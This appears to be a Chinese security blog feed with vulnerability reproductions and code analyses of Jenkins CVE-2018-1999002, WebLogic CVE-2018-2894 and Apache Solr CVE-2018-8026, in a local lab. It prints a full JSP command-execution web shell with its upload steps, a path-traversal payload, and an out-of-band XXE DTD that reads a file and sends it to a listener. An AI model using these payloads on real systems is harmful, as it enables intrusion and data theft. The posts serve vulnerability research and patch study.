<p><code>urlLocaleSelector</code>对象的声明见<code>stapler-1.250-sources.jar!/org/kohsuke/stapler/Stapler.java:390</code>:<br><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">private</span> <span class="keyword">final</span> LocaleDrivenResourceSelector urlLocaleSelector = <span class="keyword">new</span> LocaleDrivenResourceSelector() &#123;</div><div class="line">    <span class="meta">@Override</span></div><div class="line">    <span class="function">URL <span class="title">map</span><span class="params">(String url)</span> <span class="keyword">throws</span> IOException </span>&#123;</div><div class="line">        <span class="keyword">return</span> <span class="keyword">new</span> URL(url);</div><div class="line">    &#125;</div><div class="line">&#125;;</div></pre></td></tr></table></figure></p>
<p>在<code>stapler-1.250-sources.jar!/org/kohsuke/stapler/Stapler.java:324</code>实现了<code>LocaleDrivenResourceSelector</code>类的<code>open</code>方法：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">private</span> <span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">LocaleDrivenResourceSelector</span> </span>&#123;</div><div class="line">    <span class="comment">/**</span></div><div class="line">        * The 'path' is divided into the base part and the extension, and the locale-specific</div><div class="line">        * suffix is inserted to the base portion. &#123;<span class="doctag">@link</span> #map(String)&#125; is used to convert</div><div class="line">        * the combined path into &#123;<span class="doctag">@link</span> URL&#125;, until we find one that works.</div><div class="line">        *</div><div class="line">        * &lt;p&gt;</div><div class="line">        * The syntax of the locale specific resource is the same as property file localization.</div><div class="line">        * So Japanese resource for &lt;tt&gt;foo.html&lt;/tt&gt; would be named &lt;tt&gt;foo_ja.html&lt;/tt&gt;.</div><div class="line">        *</div><div class="line">        * <span class="doctag">@param</span> path</div><div class="line">        *      path/URL-like string that represents the path of the base resource,</div><div class="line">        *      say "foo/bar/index.html" or "file:///a/b/c/d/efg.png"</div><div class="line">        * <span class="doctag">@param</span> locale</div><div class="line">        *      The preferred locale</div><div class="line">        * <span class="doctag">@param</span> fallback</div><div class="line">        *      The &#123;<span class="doctag">@link</span> URL&#125; representation of the &#123;<span class="doctag">@code</span> path&#125; parameter</div><div class="line">        *      Used as a fallback.</div><div class="line">        */</div><div class="line">    <span class="function">OpenConnection <span class="title">open</span><span class="params">(String path, Locale locale, URL fallback)</span> <span class="keyword">throws</span> IOException </span>&#123;</div><div class="line">        String s = path;</div><div class="line">        <span class="keyword">int</span> idx = s.lastIndexOf(<span class="string">'.'</span>);</div><div class="line">        <span class="keyword">if</span>(idx&lt;<span class="number">0</span>)   <span class="comment">// no file extension, so no locale switch available</span></div><div class="line">            <span class="keyword">return</span> openURL(fallback);</div><div class="line">        String base = s.substring(<span class="number">0</span>,idx);</div><div class="line">        String ext = s.substring(idx);</div><div class="line">        <span class="keyword">if</span>(ext.indexOf(<span class="string">'/'</span>)&gt;=<span class="number">0</span>) <span class="comment">// the '.' we found was not an extension separator</span></div><div class="line">            <span class="keyword">return</span> openURL(fallback);</div><div class="line"></div><div class="line">        OpenConnection con;</div><div class="line"></div><div class="line">        <span class="comment">// try locale specific resources first.</span></div><div class="line">        con = openURL(map(base + <span class="string">'_'</span> + locale.getLanguage() + <span class="string">'_'</span> + locale.getCountry() + <span class="string">'_'</span> + locale.getVariant() + ext));</div><div class="line">        <span class="keyword">if</span>(con!=<span class="keyword">null</span>)   <span class="keyword">return</span> con;</div><div class="line">        con = openURL(map(base+<span class="string">'_'</span>+ locale.getLanguage()+<span class="string">'_'</span>+ locale.getCountry()+ext));</div><div class="line">        <span class="keyword">if</span>(con!=<span class="keyword">null</span>)   <span class="keyword">return</span> con;</div><div class="line">        con = openURL(map(base+<span class="string">'_'</span>+ locale.getLanguage()+ext));</div><div class="line">        <span class="keyword">if</span>(con!=<span class="keyword">null</span>)   <span class="keyword">return</span> con;</div><div class="line">        <span class="comment">// default</span></div><div class="line">        <span class="keyword">return</span> openURL(fallback);</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="comment">/**</span></div><div class="line">        * Maps the 'path' into &#123;<span class="doctag">@link</span> URL&#125;.</div><div class="line">        */</div><div class="line">    <span class="function"><span class="keyword">abstract</span> URL <span class="title">map</span><span class="params">(String path)</span> <span class="keyword">throws</span> IOException</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>先看看开头的注释，这段代码本意是想根据对应的语言（Accept-Language）来返回不同的文件，比如在<code>ja</code>的条件下请求<code>foo.html</code>，则相当于去请求<code>foo_ja.html</code>，这个过程会先把<code>foo.html</code>分成两部分：文件名<code>foo</code>和扩展名<code>.html</code>，然后根据具体的语言/国家来组合成最终的文件名。</p>
<p>结合payload来看，我们请求的url为<code>/plugin/credentials/.ini</code>，则<code>base</code>为空，扩展名（ext变量）即为<code>.ini</code>，然后通过一系列的尝试openURL，在此例中即最后一个情形<code>con = openURL(map(base+&#39;_&#39;+ locale.getLanguage()+ext));</code>，会去请求<code>_../../../../../../../../../../../../windows/win.ini</code> ，尽管目录<code>_..</code>并不存在，但在win下可以直接通过路径穿越来绕过。但在linux，则需要一个带有<code>_</code>的目录来想办法绕过。</p>
<h1 id="补丁分析"><a href="#补丁分析" class="headerlink" title="补丁分析"></a>补丁分析</h1><p>Jenkins官方修改了pom.xml，同时增加一个测试用例文件。真正的补丁在<code>stapler</code>这个web框架中，见commit记录： <a href="https://github.com/stapler/stapler/commit/8e9679b08c36a2f0cf2a81855d5e04e2ed2ac2b3" target="_blank" rel="external">https://github.com/stapler/stapler/commit/8e9679b08c36a2f0cf2a81855d5e04e2ed2ac2b3</a> ：</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180726004508-174a70d4-902a-1.png" alt="buding.png"></p>
<p>对从<code>locale</code>取出的<code>language</code>,<code>country</code>,<code>variant</code>均做了正则的校验，只允许字母数字以及特定格式的出现。在接下来的openUrl中，根据三种变量的不同检查情况来调用不同的请求，从而防止了路径穿越漏洞造成的任意文件读取漏洞。</p>
<h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><ul>
<li><a href="https://jenkins.io/security/advisory/2018-07-18/" target="_blank" rel="external">https://jenkins.io/security/advisory/2018-07-18/</a></li>
<li><a href="https://github.com/jenkinsci/jenkins/blob/d71ac6ffe98ee62e0353af7a948a4ae1a69b67e9/test/src/test/java/jenkins/security/stapler/Security914Test.java" target="_blank" rel="external">https://github.com/jenkinsci/jenkins/blob/d71ac6ffe98ee62e0353af7a948a4ae1a69b67e9/test/src/test/java/jenkins/security/stapler/Security914Test.java</a></li>
<li><a href="https://github.com/stapler/stapler/commit/8e9679b08c36a2f0cf2a81855d5e04e2ed2ac2b3" target="_blank" rel="external">https://github.com/stapler/stapler/commit/8e9679b08c36a2f0cf2a81855d5e04e2ed2ac2b3</a></li>
</ul>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;a href=&quot;https://xz.aliyun.com/t/2486&quot;&gt;Jenkins 任意文件读取漏洞复现与分析 - 【CVE-2018-1999002】&lt;/a&gt;&lt;br&gt;
    
    </summary>
    
      <category term="Web Security" scheme="http://chybeta.github.io/categories/Web-Security/"/>
    
    
      <category term="代码审计" scheme="http://chybeta.github.io/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
      <category term="java" scheme="http://chybeta.github.io/tags/java/"/>
    
      <category term="Jenkins" scheme="http://chybeta.github.io/tags/Jenkins/"/>
    
      <category term="任意文件读取" scheme="http://chybeta.github.io/tags/%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/"/>
    
  </entry>
  
  <entry>
    <title>WebLogic任意文件上传漏洞复现与分析 -【CVE-2018-2894 】</title>
    <link href="http://chybeta.github.io/2018/07/21/WebLogic%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E4%B8%8E%E5%88%86%E6%9E%90-%E3%80%90CVE-2018-2894-%E3%80%91/"/>
    <id>http://chybeta.github.io/2018/07/21/WebLogic任意文件上传漏洞复现与分析-【CVE-2018-2894-】/</id>
    <published>2018-07-21T13:15:05.000Z</published>
    <updated>2018-07-21T13:17:14.330Z</updated>
    
    <content type="html"><![CDATA[<p><a href="https://xz.aliyun.com/t/2458" target="_blank" rel="external">WebLogic任意文件上传漏洞复现与分析 -【CVE-2018-2894 】</a><br><a id="more"></a></p>
<h1 id="CVE-2018-2894"><a href="#CVE-2018-2894" class="headerlink" title="CVE-2018-2894"></a>CVE-2018-2894</h1><p>漏洞影响版本：10.3.6.0, 12.1.3.0, 12.2.1.2, 12.2.1.3</p>
<p>下载地址：<a href="http://download.oracle.com/otn/nt/middleware/12c/12213/fmw_12.2.1.3.0_wls_quick_Disk1_1of1.zip" target="_blank" rel="external">http://download.oracle.com/otn/nt/middleware/12c/12213/fmw_12.2.1.3.0_wls_quick_Disk1_1of1.zip</a></p>
<h1 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h1><p>服务启动后，访问 <a href="http://localhost:7001/ws_utc/config.do" target="_blank" rel="external">http://localhost:7001/ws_utc/config.do</a></p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180719181843-1cfa6d78-8b3d-1.png" alt="1.jpg"></p>
<p>可以将当前的工作目录为更改为其他目录。以本地环境为例，可以部署到<code>C:\Oracle\Middleware\Oracle_Home\user_projects\domains\base_domain\servers\AdminServer\tmp\_WL_internal\com.oracle.webservices.wls.ws-testclient-app-wls\4mcj4y\war</code>下</p>
<p>选择右边的<code>安全</code>栏目，添加<code>JKS Keystores</code>上传文件。假设<code>chybeta.jsp</code>内容如下：<br><figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div></pre></td><td class="code"><pre><div class="line">&lt;%@ page import="java.util.*,java.io.*,java.net.*"%&gt;</div><div class="line">&lt;HTML&gt;&lt;BODY&gt;</div><div class="line">&lt;FORM METHOD="POST" NAME="myform" ACTION=""&gt;</div><div class="line">&lt;INPUT TYPE="text" NAME="cmd"&gt;</div><div class="line">&lt;INPUT TYPE="submit" VALUE="Send"&gt;</div><div class="line">&lt;/FORM&gt;</div><div class="line">&lt;pre&gt;</div><div class="line">&lt;%</div><div class="line">if (request.getParameter("cmd") != null) &#123;</div><div class="line">        out.println("Command: " + request.getParameter("cmd") + "\n&lt;BR&gt;");</div><div class="line">        Process p = Runtime.getRuntime().exec("cmd.exe /c " + request.getParameter("cmd"));</div><div class="line">        OutputStream os = p.getOutputStream();</div><div class="line">        InputStream in = p.getInputStream();</div><div class="line">        DataInputStream dis = new DataInputStream(in);</div><div class="line">        String disr = dis.readLine();</div><div class="line">        while ( disr != null ) &#123;</div><div class="line">                out.println(disr); disr = dis.readLine(); &#125;</div><div class="line">        &#125;</div><div class="line">%&gt;</div><div class="line">&lt;/pre&gt;</div><div class="line">&lt;/BODY&gt;&lt;/HTML&gt;</div></pre></td></tr></table></figure></p>
<p>抓包获取到时间戳为<code>1531987145013</code>，则上传到的位置即<code>config\keystore\1531987145013_chybeta.jsp</code></p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180719181843-1d2762a6-8b3d-1.png" alt="2.jpg"></p>
<p>访问<code>http://localhost:7001/ws_utc/config/keystore/1531987145013_chybeta.jsp</code></p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180719181843-1d3c553a-8b3d-1.png" alt="3.jpg"></p>
<h1 id="简要漏洞分析"><a href="#简要漏洞分析" class="headerlink" title="简要漏洞分析"></a>简要漏洞分析</h1><p>在<code>ws-testpage-impl.jar!/com/oracle/webservices/testclient/setting/TestClientWorkDirManager.class:59</code>:<br><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">changeWorkDir</span><span class="params">(String path)</span> </span>&#123;</div><div class="line">    String[] oldPaths = <span class="keyword">this</span>.getRelatedPaths();</div><div class="line">    <span class="keyword">if</span> (<span class="keyword">this</span>.testPageProvider.getWsImplType() == ImplType.JRF) &#123;</div><div class="line">        <span class="keyword">this</span>.isWorkDirChangeable = <span class="keyword">false</span>;</div><div class="line">        <span class="keyword">this</span>.isWorkDirWritable = isDirWritable(path);</div><div class="line">        <span class="keyword">this</span>.isWorkDirChangeable = <span class="keyword">true</span>;</div><div class="line">        <span class="keyword">this</span>.setTestClientWorkDir(path);</div><div class="line">    &#125; <span class="keyword">else</span> &#123;</div><div class="line">        <span class="keyword">this</span>.persistWorkDir(path);</div><div class="line">        <span class="keyword">this</span>.init();</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="keyword">if</span> (<span class="keyword">this</span>.isWorkDirWritable) &#123;</div><div class="line">        String[] newPaths = <span class="keyword">this</span>.getRelatedPaths();</div><div class="line">        moveDirs(oldPaths, newPaths);</div><div class="line">    &#125; <span class="keyword">else</span> &#123;</div><div class="line">        Logger.fine(<span class="string">"[INFO] Newly specified TestClient Working Dir is readonly. Won't move the configuration stuff to new path."</span>);</div><div class="line">    &#125;</div><div class="line"></div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>此函数用于改变工作目录，但其中并未做任何检测。</p>
<p>在<code>ws-testpage-impl.jar!/com/oracle/webservices/testclient/ws/res/SettingResource.class:181</code>中：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line"><span class="meta">@Path</span>(<span class="string">"/keystore"</span>)</div><div class="line"><span class="meta">@POST</span></div><div class="line"><span class="meta">@Produces</span>(&#123;<span class="string">"application/xml"</span>, <span class="string">"application/json"</span>&#125;)</div><div class="line"><span class="meta">@Consumes</span>(&#123;<span class="string">"multipart/form-data"</span>&#125;)</div><div class="line"><span class="function"><span class="keyword">public</span> Response <span class="title">editKeyStoreSettingByMultiPart</span><span class="params">(FormDataMultiPart formPartParams)</span> </span>&#123;</div><div class="line">    <span class="keyword">if</span> (!RequestUtil.isRequstedByAdmin(<span class="keyword">this</span>.request)) &#123;</div><div class="line">        <span class="keyword">return</span> Response.status(Status.FORBIDDEN).build();</div><div class="line">    &#125; <span class="keyword">else</span> &#123;</div><div class="line">        <span class="keyword">if</span> (TestClientRT.isVerbose()) &#123;</div><div class="line">            Logger.fine(<span class="string">"calling SettingResource.addKeyStoreSettingByMultiPart"</span>);</div><div class="line">        &#125;</div><div class="line"></div><div class="line">        String currentTimeValue = <span class="string">""</span> + (<span class="keyword">new</span> Date()).getTime();</div><div class="line">        KeyValuesMap&lt;String, String&gt; formParams = RSDataHelper.getInstance().convertFormDataMultiPart(formPartParams, <span class="keyword">true</span>, TestClientRT.getKeyStorePath(), currentTimeValue);</div><div class="line">        ....</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>跟入<code>ws-testpage-impl.jar!/com/oracle/webservices/testclient/core/ws/cdf/config/parameter/TestClientRT.class:31</code><br><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">getKeyStorePath</span><span class="params">()</span> </span>&#123;</div><div class="line">    <span class="keyword">return</span> getConfigDir() + File.separator + <span class="string">"keystore"</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>得到要写入的路径<code>storePath</code>。</p>
<p>在<code>ws-testpage-impl.jar!/com/oracle/webservices/testclient/ws/util/RSDataHelper.class:145</code>:<br><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">public</span> KeyValuesMap&lt;String, String&gt; <span class="title">convertFormDataMultiPart</span><span class="params">(FormDataMultiPart formPartParams, <span class="keyword">boolean</span> isExtactAttachment, String path, String fileNamePrefix)</span> </span>&#123;</div><div class="line">    ...</div><div class="line">    <span class="keyword">if</span> (attachName != <span class="keyword">null</span> &amp;&amp; attachName.trim().length() &gt; <span class="number">0</span>) &#123;</div><div class="line">        <span class="keyword">if</span> (attachName != <span class="keyword">null</span> &amp;&amp; attachName.trim().length() != <span class="number">0</span>) &#123;</div><div class="line">            attachName = <span class="keyword">this</span>.refactorAttachName(attachName);</div><div class="line">            <span class="keyword">if</span> (fileNamePrefix == <span class="keyword">null</span>) &#123;</div><div class="line">                fileNamePrefix = key;</div><div class="line">            &#125;</div><div class="line"></div><div class="line">            String filename = (<span class="keyword">new</span> File(storePath, fileNamePrefix + <span class="string">"_"</span> + attachName)).getAbsolutePath();</div><div class="line">            kvMap.addValue(key, filename);</div><div class="line">            <span class="keyword">if</span> (isExtactAttachment) &#123;</div><div class="line">                <span class="keyword">this</span>.saveAttachedFile(filename, (InputStream)bodyPart.getValueAs(InputStream.class));</div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line">    &#125; </div><div class="line">    ...</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>把上传文件的内容传到了<code>storePath</code>目录里，文件名满足<code>fileNamePrefix + &quot;_&quot; + attachName</code>。这过程没有任何过滤和检查：）…</p>
<p>条件：</p>
<ul>
<li>需要知道部署应用的web目录</li>
<li><code>ws_utc/config.do</code>在开发模式下无需认证，在生产模式下需要认证。具体可见<a href="https://docs.oracle.com/middleware/1212/owsm/WSSEC/webservice-test.htm#WSSEC3642" target="_blank" rel="external">Oracle® Fusion Middleware Administering Web Services</a></li>
</ul>
<h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><ul>
<li><a href="http://www.oracle.com/technetwork/security-advisory/cpujul2018-4258247.html" target="_blank" rel="external">http://www.oracle.com/technetwork/security-advisory/cpujul2018-4258247.html</a></li>
<li><a href="https://mp.weixin.qq.com/s/y5JGmM-aNaHcs_6P9a-gRQ" target="_blank" rel="external">https://mp.weixin.qq.com/s/y5JGmM-aNaHcs_6P9a-gRQ</a></li>
</ul>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;a href=&quot;https://xz.aliyun.com/t/2458&quot;&gt;WebLogic任意文件上传漏洞复现与分析 -【CVE-2018-2894 】&lt;/a&gt;&lt;br&gt;
    
    </summary>
    
      <category term="Web Security" scheme="http://chybeta.github.io/categories/Web-Security/"/>
    
    
      <category term="代码审计" scheme="http://chybeta.github.io/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
      <category term="文件上传" scheme="http://chybeta.github.io/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"/>
    
      <category term="java" scheme="http://chybeta.github.io/tags/java/"/>
    
      <category term="weblogic" scheme="http://chybeta.github.io/tags/weblogic/"/>
    
  </entry>
  
  <entry>
    <title>Apache Solr XXE漏洞分析 -【CVE-2018-8026】</title>
    <link href="http://chybeta.github.io/2018/07/16/Apache-Solr-XXE%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-%E3%80%90CVE-2018-8026%E3%80%91/"/>
    <id>http://chybeta.github.io/2018/07/16/Apache-Solr-XXE漏洞分析-【CVE-2018-8026】/</id>
    <published>2018-07-16T15:13:26.000Z</published>
    <updated>2018-07-16T15:18:40.278Z</updated>
    
    <content type="html"><![CDATA[<p><a href="https://xz.aliyun.com/t/2448" target="_blank" rel="external">Apache Solr XXE漏洞分析 -【CVE-2018-8026】</a><br><a id="more"></a></p>
<h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><p>这次的XXE漏洞依赖于SolrCloud API，影响到SolrCloud分布式系统。而SolrCloud需要用到zookeeper。</p>
<h2 id="zookeeper"><a href="#zookeeper" class="headerlink" title="zookeeper"></a>zookeeper</h2><p>在 zookeeper文件夹下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">(zookeeper-3.4.12)~ cp .\conf\zoo_sample.cfg .\conf\zoo.cfg、</div></pre></td></tr></table></figure></p>
<p>修改 <code>conf\zoo.cfg</code>中的<code>dataDir</code>和<code>clientPort</code>，以我为例：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">...</div><div class="line">dataDir= D:\\vuln\\zookeeper-3.4.12\\data</div><div class="line"># the port at which the clients will connect</div><div class="line">clientPort=2181</div><div class="line">...</div></pre></td></tr></table></figure></p>
<p>然后启动服务<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">(zookeeper-3.4.12)~ .\bin\zkServer.cmd</div></pre></td></tr></table></figure></p>
<h2 id="solr"><a href="#solr" class="headerlink" title="solr"></a>solr</h2><p>solr受影响版本： 6.6.4, 7.3.1</p>
<p>solr的具体搭建过程不详细说明。通过<code>ant idea</code>等一系列编译可以搭建idea环境。最后启动solr服务时如下，其中<code>-DzkHost=localhost</code>即上面配置zookeeper的<code>clientPort</code>:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">solr start -p 8983 -f -a &quot;-Xdebug -Xrunjdwp:transport=dt_socket,server=y,suspend=y,address=8988 -DzkHost=localhost:2181&quot;</div></pre></td></tr></table></figure></p>
<h1 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h1><p>附上最简单的脚本evil.py，其中evil.zip见文章附件：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> requests</div><div class="line"></div><div class="line">upload_url = <span class="string">"http://127.0.0.1:8983/solr/admin/configs?action=UPLOAD&amp;name=evilconfig"</span></div><div class="line">files = open(<span class="string">"evil.zip"</span>, <span class="string">"rb"</span>)</div><div class="line">print(requests.post(upload_url, data=files).text)</div><div class="line"></div><div class="line">create_url = <span class="string">"http://127.0.0.1:8983/solr/admin/collections?action=CREATE&amp;name=eviltest&amp;numShards=1&amp;collection.configName=evilconfig"</span></div><div class="line">print(requests.get(create_url).text)</div></pre></td></tr></table></figure></p>
<p>还有外部实体xxe.dtd，如下用于读取存放在C盘根目录下的chybeta.txt文件：<br><figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;!ENTITY % file SYSTEM "file:///C:/chybeta.txt"&gt;&lt;!ENTITY % int "&lt;!ENTITY &amp;#37; send SYSTEM 'http://127.0.0.1:8888?%file;/'&gt;"&gt;%int;%send;</div></pre></td></tr></table></figure></p>
<p>如下图，<code>8000</code>服务器用于提供xxe.dtd，<code>8888</code>服务器用于接受xxe传送出来的结果</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180716173805-f0eca9ac-88db-1.gif" alt="4.gif"></p>
<p>关于XXE的攻击方式等知识不妨参考<a href="https://chybeta.github.io/2017/07/04/%E5%B0%8F%E8%AF%95XML%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB/">小试XML实体注入攻击</a></p>
<h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><h2 id="XXE-1"><a href="#XXE-1" class="headerlink" title="XXE 1"></a>XXE 1</h2><p>第一步是需要去上传ConfigSet，根据<a href="https://lucene.apache.org/solr/guide/6_6/configsets-api.html#ConfigSetsAPI-upload" target="_blank" rel="external">Upload a ConfigSet</a>，这一步是将几个xml文件打包成压缩包后上传，其中 schema.xml内容为：<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="php"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span><span class="meta">?&gt;</span></span></div><div class="line"><span class="tag">&lt;<span class="name">schema</span> <span class="attr">name</span>=<span class="string">"test"</span> <span class="attr">version</span>=<span class="string">"1.1"</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">fieldType</span> <span class="attr">name</span>=<span class="string">"string"</span> <span class="attr">class</span>=<span class="string">"solr.StrField"</span> /&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">fieldType</span> <span class="attr">name</span>=<span class="string">"currency"</span> <span class="attr">class</span>=<span class="string">"solr.CurrencyField"</span> <span class="attr">precisionStep</span>=<span class="string">"8"</span> <span class="attr">defaultCurrency</span>=<span class="string">"USD"</span> <span class="attr">currencyConfig</span>=<span class="string">"currency.xml"</span> /&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">schema</span>&gt;</span></div></pre></td></tr></table></figure></p>
<p>currency.xml为：<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="php"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span><span class="meta">?&gt;</span></span><span class="meta">&lt;!DOCTYPE ANY[&lt;!ENTITY % remote SYSTEM "http://127.0.0.1:8000/xxe.dtd"&gt;    %remote;    ]&gt;</span></div></pre></td></tr></table></figure></p>
<p>还有一个solrconfig.xml，其内容在此省略。</p>
<p>考虑到是xxe，因此主要来看在何处发生了xml外部实体的解析。当开始第二个请求<code>solr/admin/collections?action=CREATE</code>时，solrcloud将根据指定的<code>collection.configName</code>即上一步上传的evilconfig来进行创建Collections。</p>
<p>org/apache/solr/schema/FileExchangeRateProvider.java:245<br><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">inform</span><span class="params">(ResourceLoader loader)</span> <span class="keyword">throws</span> SolrException </span>&#123;</div><div class="line">  <span class="keyword">if</span>(loader == <span class="keyword">null</span>) &#123;</div><div class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> SolrException(SolrException.ErrorCode.SERVER_ERROR, <span class="string">"Needs ResourceLoader in order to load config file"</span>);</div><div class="line">  &#125;</div><div class="line">  <span class="keyword">this</span>.loader = loader;</div><div class="line">  reload();</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>跟进<code>reload</code>，到达<br>org/apache/solr/schema/FileExchangeRateProvider.java:159，此时变量如下</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180716173805-f0ff3c0c-88db-1.png" alt="1.jpg"></p>
